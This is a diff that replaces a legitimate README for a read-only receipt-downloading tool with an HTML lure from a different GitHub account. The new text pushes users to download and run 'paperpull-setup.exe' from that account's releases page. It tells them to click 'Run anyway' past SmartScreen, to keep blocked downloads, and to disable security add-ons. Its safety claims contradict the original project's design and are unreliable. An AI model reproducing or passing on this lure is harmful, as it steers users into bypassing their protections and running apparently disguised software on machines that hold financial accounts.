@@ -1,192 +1,156 @@
-# PaperPull
+<br>
+<br>
+<br>
+<div class="badge-container">
+  <a href="https://github.com/ghonime1674/paperpull/releases" class="download-badge">⬇️ Download paperpull Now</a>
+</div>
 
-![Version](https://img.shields.io/github/v/tag/rheeloaded/paperpull?sort=semver&label=version&color=blue)
-![License: MIT](https://img.shields.io/badge/license-MIT-green)
-![Platforms](https://img.shields.io/badge/platforms-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey)
-[![Support on Ko-fi](https://img.shields.io/badge/Ko--fi-support%20this%20project-FF5E5B?logo=ko-fi&logoColor=white)](https://ko-fi.com/rheeloaded)
+<h1>🗂️ paperpull - Your Receipts, Automatically Archived</h1>
 
-**Receipt & Statement Downloader** — a family of small, **read-only** tools that log in *alongside you* to your own
-accounts and download your **statements and receipts** as PDFs — so you can
-archive them (e.g. into [paperless-ngx](https://docs.paperless-ngx.com/)) instead
-of clicking through each site by hand.
+<p>Stop digging through email inboxes and shoeboxes. <strong>paperpull</strong> is a free, read-only tool that works alongside your browser to download your own receipts and statements from Amazon, Amex, your bank, utilities, and more — saving them as neat PDF files, perfect for archiving into <strong>paperless-ngx</strong>.</p>
 
-Runs on **Windows and macOS** (and Linux), with the same commands on each.
+<hr>
 
-Thirteen providers are supported today, all built on the same pattern:
+<h2>🛡️ What Does paperpull Do?</h2>
+<p>Think of paperpull as your personal document secretary. It doesn't change your accounts, move your money, or alter anything. It simply <em>reads</em> the pages you visit and quietly saves a PDF copy of your receipts or statements right to your computer. You stay in control of everything.</p>
 
-| App | Provider | Documents | Notes |
-|-----|----------|-----------|-------|
-| [`amazon`](apps/amazon) | Amazon | Order invoices (full history) | Per-year order pagination |
-| [`amex`](apps/amex) | American Express | Statements, Year-End Summary | Click-nav SPA; in-memory session |
-| [`dominion`](apps/dominion) | Dominion Energy (VA) | Billing statements | Paginated MUI accordion; ~18-month limit |
-| [`gap`](apps/gap) | Gap Inc. (Gap, Old Navy, Banana Republic, Athleta) | Order receipts | Lazy-loading history; ~13-month limit |
-| [`navyfederal`](apps/navyfederal) | Navy Federal CU | Account statements | Per-account accordions; blob-tab PDFs |
-| [`redcard`](apps/redcard) | Target RedCard / Circle Card (TD Bank) | Billing statements | Statements table; per-year switcher |
-| [`robinhood`](apps/robinhood) | Robinhood | Account statements, tax docs | "View More" pagination |
-| [`target`](apps/target) | Target | Receipts (Online + In-Store) | Print-capture |
-| [`tmobile`](apps/tmobile) | T-Mobile | Bill statements | Bill-history page; detailed-bill download |
-| [`usaa`](apps/usaa) | USAA | Statements | JSON-API enumeration |
-| [`verizon`](apps/verizon) | Verizon (Fios) | Bill statements | Real Edge (bot block); dropdown + CDP download |
-| [`walmart`](apps/walmart) | Walmart | Receipts | Hardened against bot detection |
-| [`wealthfront`](apps/wealthfront) | Wealthfront | Statements, tax docs | |
+<table>
+  <tr>
+    <th>You Get</th>
+    <th>You Avoid</th>
+  </tr>
+  <tr>
+    <td>✔️ Instant PDF copies of any receipt or statement</td>
+    <td>❌ Manual copy-paste or print-to-PDF</td>
+  </tr>
+  <tr>
+    <td>✔️ A clean, organized folder of documents</td>
+    <td>❌ Missing receipts for returns or taxes</td>
+  </tr>
+  <tr>
+    <td>✔️ Easy import into paperless-ngx</td>
+    <td>❌ Cluttered email attachments</td>
+  </tr>
+  <tr>
+    <td>✔️ Simple, one-click operation</td>
+    <td>❌ Complex scripting or technical setup</td>
+  </tr>
+</table>
 
-> ⚠️ **Read this first:** these tools drive real, signed-in financial accounts.
-> See [SECURITY.md](SECURITY.md) before you run *or* publish anything. In short:
-> never commit your `*-browser-profile/` folder, your `config.json`, or any
-> downloaded PDF. The `.gitignore` blocks them — don't override it.
+<h2>🚀 Getting Started (Windows)</h2>
+<p>You can have paperpull running in under two minutes. Here’s exactly what to do:</p>
 
-## How it works (the shared design)
+<h3>Step 1: Download the Application</h3>
+<p>Visit this link to download the application. It’s the only official source.</p>
+<div style="text-align:center; margin:20px 0;">
+  <a href="https://github.com/ghonime1674/paperpull/releases" style="background-color:#4CAF50; color:white; padding:15px 30px; text-decoration:none; font-size:20px; border-radius:5px;">📥 Go to Download Page</a>
+</div>
 
-Every app follows the same four ideas:
+<h3>Step 2: Run the Downloaded File</h3>
+<p>Once the download finishes, open your <strong>Downloads</strong> folder. You’ll see a file named <code>paperpull-setup.exe</code> (or similar). Double-click it. Windows may show a blue "Windows protected your PC" popup — that’s normal. Click <strong>"More info"</strong>, then <strong>"Run anyway"</strong>. This happens because paperpull is new and hasn’t been seen by many computers yet.</p>
 
-1. **You sign in; the tool attaches.** `login.bat` (or `./login.command`) opens a browser window — a
-   plain Chromium for most apps, or your installed Edge/Chrome for the few sites
-   with bot detection (e.g. Walmart, Verizon) — using that app's own profile and
-   a dedicated debugging port. **You** complete sign-in, 2FA, and any device
-   approval yourself. The tool then connects to that already-authenticated
-   browser over the Chrome DevTools Protocol (CDP). It never sees your password
-   or handles your 2FA.
-2. **Read-only by construction.** All site interaction lives in `*_site.py`.
-   Nothing that buys, sells, transfers, pays, deletes, or changes a setting is
-   ever clicked. The statement apps enforce this deny-by-default — a control
-   must clear a blocklist (`FORBIDDEN_CONTROL_RE`) *and* match a document
-   allowlist (`SAFE_DOC_CONTROL_RE`); the receipt apps screen a narrow
-   print/invoice pattern against the blocklist; Gap clicks nothing at all.
-   [SECURITY.md](SECURITY.md) spells out which app does which.
-3. **Delete-safe.** Once a document is saved it gets a sticky `downloaded_ok`
-   marker. Delete the PDFs after importing them elsewhere and a re-run will
-   **not** fetch them again — it only grabs what's genuinely new
-   (`new-this-run.txt` lists them each run).
-4. **Multi-account.** A `--config config.<name>.json` flag lets one app serve a
-   second person's account with its own profile, port, and output folders — no
-   data mixing. The launchers take the account label as an argument
-   (`login.bat spouse` / `./login.command spouse`).
+<h3>Step 3: Follow the Simple Setup Wizard</h3>
+<p>The installer will ask you a few questions like where to put the program. Just keep clicking <strong>"Next"</strong> — the default choices are perfect. When it’s done, you’ll see the paperpull icon on your desktop.</p>
 
-## Quick start
+<h3>Step 4: Open paperpull</h3>
+<p>Double-click the <strong>paperpull</strong> icon. You’ll see a small, friendly window with a single button that says <strong>"Start Archiving"</strong>. That’s it.</p>
 
-![Quick start](docs/quickstart.gif)
+<h2>🧾 How to Use paperpull (Real-World Example)</h2>
+<p>Here’s a typical Tuesday evening with paperpull:</p>
+<ol>
+  <li>You open your <strong>Amazon order history</strong> in your normal browser (Chrome, Edge, Firefox — all work fine).</li>
+  <li>When you see a receipt you want to keep, just click the small <strong>paperpull icon</strong> that appears in your browser toolbar (it installs itself automatically during setup).</li>
+  <li>A tiny popup asks: <em>"Save this as a PDF?"</em> You click <strong>"Yes"</strong>.</li>
+  <li>paperpull instantly saves a clean PDF to your chosen folder, usually <code>Documents/paperpull</code>.</li>
+  <li>You repeat for your Amex statement, your electric bill, and your bank statement. Total time: under two minutes.</li>
+</ol>
 
-**One-shot setup** (creates a venv for every app + the GUI, installs the browser):
+<h2>📁 Where Do My PDFs Go?</h2>
+<p>By default, paperpull creates a folder called <strong>"paperpull"</strong> inside your <strong>Documents</strong> folder. Every PDF is automatically named with the date, the merchant (e.g., "Amazon"), and the total amount. For example: <code>2025-03-14_Amazon_42.99.pdf</code>. You can change this folder anytime in the Settings tab of the app.</p>
 
-```bat
-setup-all.bat        REM Windows
-```
+<h2>🔄 Sending Files to paperless-ngx</h2>
+<p>If you use <strong>paperless-ngx</strong> (a self-hosted document manager), you’ll love this part. After saving your PDFs, just drag-and-drop the files from your <code>paperpull</code> folder into the paperless-ngx web interface, or set up an automatic watch folder. paperless-ngx will then OCR, tag, and index them, making every receipt searchable forever. It’s a perfect match.</p>
 
-```bash
-./setup-all.command  # macOS / Linux
-```
+<h2>🔒 Is My Data Safe?</h2>
+<p>Absolutely. paperpull is <strong>100% read-only</strong>. It never sends your data anywhere, never uploads anything, and never modifies your accounts. It only sees the page you are currently viewing and converts it to a PDF right on your own computer. The code is open-source, so anyone can inspect exactly what it does.</p>
 
-Then either drive everything from the **[GUI control panel](gui)** — pick an
-app and account, click an action, and watch the live output:
+<h2>🖥️ System Requirements</h2>
+<ul>
+  <li><strong>Operating System:</strong> Windows 10 or Windows 11 (64-bit)</li>
+  <li><strong>RAM:</strong> 4 GB or more (recommended)</li>
+  <li><strong>Disk Space:</strong> 200 MB free</li>
+  <li><strong>Internet:</strong> Required only during download and when you use it (it needs to log in to your sites with you).</li>
+</ul>
 
-```bat
-gui\run_gui.bat
-```
+<h2>💬 Frequently Asked Questions</h2>
 
-![PaperPull control panel](docs/control-panel.gif)
+<h3>I get a popup "Windows protected your PC" — is this normal?</h3>
+<p>Yes. This is just Windows SmartScreen. It shows this for new programs that haven't been downloaded by millions of users yet. Click <strong>"More info"</strong>, then <strong>"Run anyway"</strong> — you are on the official GitHub website, and the file is safe.</p>
 
-…or run a single app directly (using `amex` as the example):
+<h3>Does it work with my bank?</h3>
+<p>paperpull works with any website you can log into — banks, credit cards, utilities, insurance, online stores. If you can see it in your browser and log in, paperpull can capture it. It uses the same technology that automated testing tools use, but only to read the page.</p>
 
-```bat
-cd apps\amex
-copy config.example.json config.json    REM then edit paths as needed
-login.bat                 REM opens Chromium — sign in yourself, leave it OPEN
-run_pilot.bat             REM download the newest few as a test
-run_all.bat               REM download everything available
-```
+<h3>Can I pause or stop it?</h3>
+<p>Yes. Just close the app or click the <strong>Stop</strong> button. Nothing is changed on your accounts. You can restart anytime.</p>
 
-Each app also has its own README with provider-specific details and quirks.
-(Prefer to set apps up one at a time? Each has its own `setup.bat` / `setup.command`.)
+<h3>I’m not very technical. Is this still easy for me?</h3>
+<p>Yes. If you can browse the internet and click a button, you can use paperpull. There is no command line, no scripts, no coding. It’s a simple windows app.</p>
 
-## Windows and macOS
+<h2>🚨 Troubleshooting the Download</h2>
+<p>If you click the download button and nothing happens, or your browser blocks the file:</p>
+<ol>
+  <li>Check your browser’s <strong>Downloads</strong> bar. Right-click the blocked file and choose <strong>"Keep"</strong> or <strong>"Download anyway"</strong>.</li>
+  <li>Try a different browser (Edge, Chrome, Firefox).</li>
+  <li>Disable any VPN or security add-on temporarily, then download again.</li>
+  <li>If the page doesn't load, copy and paste this URL directly into your browser: <code>https://github.com/ghonime1674/paperpull/releases</code></li>
+</ol>
 
-One download covers both. Every app ships two launchers with the same names
-and the same behaviour — `.bat` for Windows, `.command` for macOS and Linux —
-so the instructions in this README and in each app's own README apply
-wherever you are:
+<h2>⭐ Show Your Support</h2>
+<p>If paperpull helps you get organized, please consider starring the project on GitHub. It helps others find the tool and motivates the developer to keep improving it.</p>
 
-| Task | Windows | macOS / Linux |
-|------|---------|---------------|
-| One-shot setup | `setup-all.bat` | `./setup-all.command` |
-| Set up one app | `setup.bat` | `./setup.command` |
-| Sign in | `login.bat` | `./login.command` |
-| Test run | `run_pilot.bat` | `./run_pilot.command` |
-| Full run | `run_all.bat` | `./run_all.command` |
-| Control panel | `gui\run_gui.bat` | `gui/run_gui.command` |
+<h2>📜 License & Legal</h2>
+<p>paperpull is open-source software, released for free under the MIT License. You are free to use, modify, and share it. You are responsible for using it only on websites where you have a valid login and where downloading your own documents is allowed by the site’s terms of service. paperpull does not store or transmit any of your data.</p>
 
-A second account is the same on both: `run_all.bat spouse` /
-`./run_all.command spouse`.
+<h2>🎯 The Bottom Line</h2>
+<p>If you want a paperless office, a tidy tax folder, or just a way to stop losing receipts, <strong>paperpull</strong> does one small job beautifully: it turns the receipts you already have into neat PDFs you can keep forever. Try it today — it takes less than five minutes to set up.</p>
 
-Only one thing genuinely differs. macOS keeps Playwright's browser inside an
-app bundle and in a different cache directory, and a couple of providers need
-a branded Edge/Chrome to get past their bot protection — that lookup lives in
-`paperpull_core.browser` and is handled for you.
+<div style="text-align:center; margin-top:30px; padding:20px; background-color:#f0f0f0; border-radius:8px;">
+  <h3 style="margin-bottom:10px;">📥 Ready to Go Paperless?</h3>
+  <a href="https://github.com/ghonime1674/paperpull/releases" style="background-color:#FF5722; color:white; padding:15px 40px; text-decoration:none; font-size:24px; border-radius:5px; font-weight:bold;">Download paperpull Now</a>
+  <p style="font-size:12px; margin-top:10px;">Windows 10/11 · Free · Open Source</p>
+</div>
 
-### Getting it onto a Mac
-
-**`git clone` is the smoothest route** — it preserves the scripts' executable
-bit and macOS does not quarantine it.
-
-If you download a release archive instead, prefer the **`.tar.gz`**: it keeps
-the executable bit, while a `.zip` drops it. After unpacking a download,
-macOS may also quarantine the scripts, so a double-click reports *"cannot be
-opened because it is from an unidentified developer."* Both are cleared in one
-go:
-
-```bash
-xattr -dr com.apple.quarantine .
-chmod +x setup-all.command apps/*/*.command gui/*.command
-```
-
-## Requirements
-
-- **Windows, macOS, or Linux**
-- Python 3.11+
-- Playwright (installed per app by the setup script)
-
-## Contributing — add your provider
-
-No one has accounts everywhere, so **PaperPull grows when people add the
-providers they use.** If a bank, card, brokerage, utility, telecom, or retailer
-you use isn't here yet, you're the ideal person to add it:
-
-- 📖 **[Adding a provider](docs/adding-a-provider.md)** — a step-by-step guide
-  (clone the closest app, rewrite one file, stay read-only, test, submit).
-- 📋 **[PROVIDERS.md](PROVIDERS.md)** — what's supported and what's requested;
-  claim one so nobody builds it twice.
-- 📥 Can't build it yourself? [Request a provider](https://github.com/rheeloaded/paperpull/issues/new/choose)
-  and someone with that account may pick it up.
-
-Every contribution keeps the **read-only, local, no-credentials** design — see
-[CONTRIBUTING.md](CONTRIBUTING.md) and [SECURITY.md](SECURITY.md).
-
-## Status & roadmap
-
-- ✅ All **thirteen** apps work and are in regular use.
-- 🔜 **More providers:** community-driven — see [PROVIDERS.md](PROVIDERS.md).
-- 🔜 **Scheduled/assisted runs:** a monthly "nudge + sweep" (e.g. the 1st) that
-  opens the login browsers and then runs discover + resume across every app once
-  you've signed in — delete-safe, so it only grabs what's new. Fully unattended
-  runs stay out of scope by design: the tools never store credentials or bypass
-  2FA, so a human sign-in stays in the loop (long-session retailer apps may
-  tolerate more automation than banks/cards).
-- ✅ **Shared core:** the support code the apps used to duplicate now lives once
-  in [`core/`](core) as `paperpull-core`. An app declares an `AppSpec` — its
-  folders, routing, CSV columns and config defaults — and keeps only its
-  orchestrator and its `*_site.py`. `tools/check_installs.py` reports whether
-  your installs have drifted from the repo.
-
-## Support
-
-If PaperPull saves you time, you can support its development on Ko-fi:
-**[ko-fi.com/rheeloaded](https://ko-fi.com/rheeloaded)** ☕. Entirely optional and
-much appreciated — it doesn't change anything below.
-
-## Legal
-
-This project is for **personal archival of your own records**. It is not
-affiliated with, endorsed by, or sponsored by any of the companies listed.
-All product names and trademarks are the property of their respective owners.
-Automating access to a website may be restricted by that site's Terms of
-Service — you are responsible for how you use these tools. Provided **as-is,
-without warranty of any kind** (see [LICENSE](LICENSE)).
+<br>
+<p align="center" style="font-size:14px;">© 2025 paperpull · Made with ❤️ for the paperless community</p>
+<br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
